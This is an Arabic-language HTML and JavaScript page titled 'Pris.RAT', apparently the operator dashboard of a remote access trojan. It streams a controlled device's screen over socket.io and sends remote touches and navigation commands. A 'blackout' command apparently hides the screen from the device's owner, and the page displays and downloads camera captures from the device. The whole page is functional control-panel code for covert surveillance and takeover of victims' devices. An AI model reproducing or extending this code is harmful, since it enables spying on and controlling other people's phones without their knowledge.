<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pris.RAT — عرض الشاشة</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Tahoma', sans-serif; }

:root {
  --bg: #0a0a0f;
  --panel: #0f1117;
  --panel-2: #14161d;
  --border: #1e212b;
  --red: #ff0033;
  --red-dim: rgba(255,0,51,0.15);
  --green: #00ff88;
  --blue: #0099ff;
  --text: #e8e8ea;
  --text-dim: #7a7e8a;
}

body {
  background: #000;
  color: var(--text);
  height: 100vh;
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

/* TOP BAR */
.top-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 12px 20px;
  background: linear-gradient(90deg, rgba(20,0,10,0.98), rgba(10,10,20,0.98));
  border-bottom: 2px solid var(--red);
  box-shadow: 0 0 20px rgba(255,0,51,0.4);
  z-index: 10;
  flex-wrap: wrap;
  gap: 10px;
}

.top-left {
  display: flex;
  align-items: center;
  gap: 15px;
  flex-wrap: wrap;
}

.back-btn {
  background: linear-gradient(135deg, #333, #111);
  color: #fff;
  border: 2px solid #555;
  padding: 8px 15px;
  border-radius: 8px;
  text-decoration: none;
  font-size: 13px;
  font-weight: bold;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: all 0.3s;
}

.back-btn:hover {
  border-color: var(--red);
  box-shadow: 0 0 15px rgba(255,0,51,0.4);
}

.title {
  font-size: 16px;
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 8px;
}

.device-tag {
  background: var(--red-dim);
  border: 1px solid var(--red);
  padding: 4px 12px;
  border-radius: 15px;
  font-size: 11px;
  color: #ff5566;
}

.top-right {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap;
}

.status-pill {
  display: flex;
  align-items: center;
  gap: 6px;
  background: rgba(0,255,136,0.08);
  border: 1px solid var(--green);
  padding: 6px 14px;
  border-radius: 20px;
  color: var(--green);
  font-size: 12px;
  font-weight: bold;
}

.dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: var(--green);
  box-shadow: 0 0 10px var(--green);
  animation: pulse 1.5s infinite;
}

@keyframes pulse {
  0%,100% { opacity: 1; }
  50% { opacity: 0.3; }
}

.stop-btn {
  background: linear-gradient(135deg, var(--red), #990000);
  color: #fff;
  border: none;
  padding: 8px 18px;
  border-radius: 8px;
  font-weight: bold;
  cursor: pointer;
  font-size: 13px;
  display: flex;
  align-items: center;
  gap: 6px;
  transition: all 0.3s;
}

.stop-btn:hover {
  box-shadow: 0 0 20px rgba(255,0,51,0.8);
}

/* MAIN */
.main {
  flex: 1;
  display: flex;
  overflow: hidden;
  position: relative;
}

/* TOOLBAR */
.toolbar {
  width: 70px;
  background: linear-gradient(180deg, rgba(15,5,15,0.98), rgba(10,10,20,0.98));
  border-left: 2px solid var(--red);
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 15px 0;
  gap: 10px;
  box-shadow: -2px 0 20px rgba(255,0,51,0.2);
}

.tool-btn {
  width: 50px;
  height: 50px;
  background: rgba(255,0,51,0.1);
  border: 2px solid #333;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 22px;
  cursor: pointer;
  transition: all 0.3s;
  color: #fff;
}

.tool-btn:hover {
  border-color: var(--red);
  background: rgba(255,0,51,0.3);
  box-shadow: 0 0 15px rgba(255,0,51,0.6);
  transform: scale(1.1);
}

.tool-btn.red:hover {
  border-color: #f00;
  background: rgba(255,0,0,0.3);
}

/* SCREEN AREA */
.screen-area {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  background:
    radial-gradient(circle at 50% 50%, rgba(255,0,51,0.05) 0%, transparent 60%),
    #000;
  position: relative;
  padding: 15px;
}

.screen-frame {
  position: relative;
  max-width: 100%;
  max-height: 100%;
  border: 3px solid var(--red);
  border-radius: 15px;
  overflow: hidden;
  box-shadow:
    0 0 30px rgba(255,0,51,0.5),
    0 0 60px rgba(255,0,51,0.2);
  background: #111;
}

#screenImg {
  display: block;
  max-width: 100%;
  max-height: calc(100vh - 140px);
  cursor: crosshair;
  user-select: none;
  -webkit-user-drag: none;
}

/* LOADING */
.loading {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  text-align: center;
  pointer-events: none;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid rgba(255,0,51,0.2);
  border-top-color: var(--red);
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 15px;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.loading-text {
  color: #ff5566;
  font-size: 13px;
  font-weight: bold;
}

/* BOTTOM BAR */
.bottom-bar {
  padding: 10px 20px;
  background: rgba(10,10,15,0.95);
  border-top: 2px solid #333;
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 11px;
  color: #666;
  flex-wrap: wrap;
  gap: 10px;
}

.info-item {
  display: flex;
  align-items: center;
  gap: 6px;
}

.info-item .label { color: #555; }
.info-item .value { color: #ff5566; font-weight: bold; }

/* TOAST */
.toast {
  position: fixed;
  top: 80px;
  left: 20px;
  padding: 12px 22px;
  border-radius: 10px;
  font-weight: bold;
  z-index: 10001;
  font-size: 13px;
  border: 2px solid;
  max-width: 280px;
}

.toast.success { background: rgba(0,255,136,0.15); color: var(--green); border-color: var(--green); }
.toast.error { background: rgba(255,51,51,0.15); color: #ff3333; border-color: #ff3333; }
.toast.info { background: rgba(255,0,51,0.15); color: #ff5566; border-color: var(--red); }

/* IMAGE VIEWER */
.img-viewer {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.95);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 99999;
  flex-direction: column;
  padding: 20px;
}

.img-toolbar {
  position: absolute;
  top: 20px;
  right: 20px;
  display: flex;
  gap: 10px;
  z-index: 100000;
}

.img-btn {
  padding: 12px 20px;
  border-radius: 10px;
  font-weight: bold;
  font-size: 13px;
  cursor: pointer;
  border: none;
  font-family: inherit;
  color: #fff;
  text-decoration: none;
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

.img-btn.download {
  background: linear-gradient(135deg, var(--blue), #0055aa);
  box-shadow: 0 0 15px rgba(0,153,255,0.5);
}

.img-btn.close {
  background: linear-gradient(135deg, var(--red), #990000);
  box-shadow: 0 0 15px rgba(255,0,51,0.5);
}

/* MOBILE */
@media (max-width: 700px) {
  .title { font-size: 13px; }
  .device-tag { display: none; }
  .toolbar {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    width: 100%;
    height: 70px;
    flex-direction: row;
    justify-content: space-around;
    border-left: none;
    border-top: 2px solid var(--red);
    padding: 0 10px;
    z-index: 100;
  }
  .tool-btn {
    width: 45px;
    height: 45px;
    font-size: 18px;
  }
  .screen-area { padding: 10px 10px 80px 10px; }
  #screenImg { max-height: calc(100vh - 220px); }
  .bottom-bar { padding: 8px 10px; font-size: 10px; }
}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="top-bar">
  <div class="top-left">
    <a href="/dashboard" class="back-btn">← رجوع</a>
    <div class="title">📺 <span>عرض الشاشة المباشر</span></div>
    <div class="device-tag" id="deviceTag">...</div>
  </div>
  <div class="top-right">
    <div class="status-pill">
      <div class="dot"></div>
      <span>متصل</span>
    </div>
    <button class="stop-btn" onclick="stopScreen()">🛑 إيقاف</button>
  </div>
</div>

<!-- MAIN -->
<div class="main">
  <div class="toolbar">
    <div class="tool-btn" onclick="sendCmd('screenshot')" title="لقطة شاشة">📸</div>
    <div class="tool-btn" onclick="sendCmd('back')" title="زر الرجوع">◀</div>
    <div class="tool-btn" onclick="sendCmd('home')" title="زر الرئيسية">🏠</div>
    <div class="tool-btn" onclick="sendCmd('recents')" title="التطبيقات الأخيرة">▢</div>
    <div class="tool-btn red" onclick="sendCmd('blackout')" title="شاشة سوداء">⬛</div>
  </div>

  <div class="screen-area">
    <div class="screen-frame">
      <img id="screenImg" src="" style="display:none;">
      <div class="loading" id="loading">
        <div class="spinner"></div>
        <div class="loading-text">في انتظار الشاشة...</div>
      </div>
    </div>
  </div>
</div>

<!-- BOTTOM BAR -->
<div class="bottom-bar">
  <div class="info-item"><span class="label">الحالة:</span><span class="value" id="statusTxt">جاهز</span></div>
  <div class="info-item"><span class="label">آخر تحديث:</span><span class="value" id="lastUpdate">--</span></div>
  <div class="info-item"><span class="label">FPS:</span><span class="value" id="fpsTxt">1</span></div>
</div>

<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
const socket = io();
let selectedDevice = null;
let frameCount = 0;
let lastFpsTime = Date.now();
let firstFrameReceived = false;

try {
  selectedDevice = sessionStorage.getItem('selectedDevice');
} catch(e) {}

document.getElementById('deviceTag').textContent = selectedDevice || 'غير محدد';

function requestScreen() {
  if (selectedDevice) {
    socket.emit('send_command', { target: selectedDevice, action: 'request_screen' });
  }
}

socket.on('connect', requestScreen);
if (selectedDevice) requestScreen();

socket.on('device_response', (data) => {
  if (data.type === 'screen' && data.image) {
    if (!firstFrameReceived) {
      firstFrameReceived = true;
      document.getElementById('loading').style.display = 'none';
      document.getElementById('screenImg').style.display = 'block';
    }
    document.getElementById('screenImg').src = 'data:image/jpeg;base64,' + data.image;
    document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString('ar-EG');
    frameCount++;
    const now = Date.now();
    if (now - lastFpsTime > 1000) {
      document.getElementById('fpsTxt').textContent = frameCount;
      frameCount = 0;
      lastFpsTime = now;
    }
    document.getElementById('statusTxt').textContent = 'يتلقى';
  }
  if (data.type === 'camera' && data.image) {
    showImage('data:image/jpeg;base64,' + data.image);
  }
});

document.getElementById('screenImg').addEventListener('click', function(e) {
  if (!selectedDevice) return;
  const rect = this.getBoundingClientRect();
  const x = (e.clientX - rect.left) / rect.width;
  const y = (e.clientY - rect.top) / rect.height;
  if (x < 0 || x > 1 || y < 0 || y > 1) return;
  socket.emit('send_command', {
    target: selectedDevice,
    action: 'touch',
    params: { x: x, y: y, relative: true }
  });
  showToast('👆 لمسة', 'info');
});

function sendCmd(action) {
  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
  socket.emit('send_command', { target: selectedDevice, action: action });
  showToast('📤 ' + action, 'info');
}

function stopScreen() {
  if (selectedDevice) socket.emit('send_command', { target: selectedDevice, action: 'stop_screen' });
  showToast('🛑 تم الإيقاف', 'info');
  setTimeout(() => window.location.href = '/dashboard', 800);
}

function showImage(src) {
  const old = document.getElementById('imgViewer');
  if (old) old.remove();

  const v = document.createElement('div');
  v.id = 'imgViewer';
  v.className = 'img-viewer';

  const toolbar = document.createElement('div');
  toolbar.className = 'img-toolbar';

  const dlBtn = document.createElement('a');
  dlBtn.href = src;
  dlBtn.download = 'pris_capture_' + Date.now() + '.jpg';
  dlBtn.textContent = '⬇️ تحميل';
  dlBtn.className = 'img-btn download';
  toolbar.appendChild(dlBtn);

  const closeBtn = document.createElement('button');
  closeBtn.textContent = '✖ إغلاق';
  closeBtn.className = 'img-btn close';
  closeBtn.onclick = () => v.remove();
  toolbar.appendChild(closeBtn);

  const img = document.createElement('img');
  img.src = src;
  img.style.cssText = 'max-width:95%;max-height:85%;border:3px solid #ff0033;border-radius:12px;box-shadow:0 0 40px rgba(255,0,51,0.8);';

  const info = document.createElement('div');
  info.style.cssText = 'color:#888;font-size:12px;margin-top:15px;';
  info.textContent = 'صورة من الجهاز — ' + new Date().toLocaleString('ar-EG');

  v.appendChild(toolbar);
  v.appendChild(img);
  v.appendChild(info);
  v.onclick = (e) => { if (e.target === v) v.remove(); };
  document.body.appendChild(v);
}

function showToast(msg, type) {
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 2000);
}

window.addEventListener('beforeunload', () => {
  if (selectedDevice) socket.emit('send_command', { target: selectedDevice, action: 'stop_screen' });
});
</script>
</body>
</html>
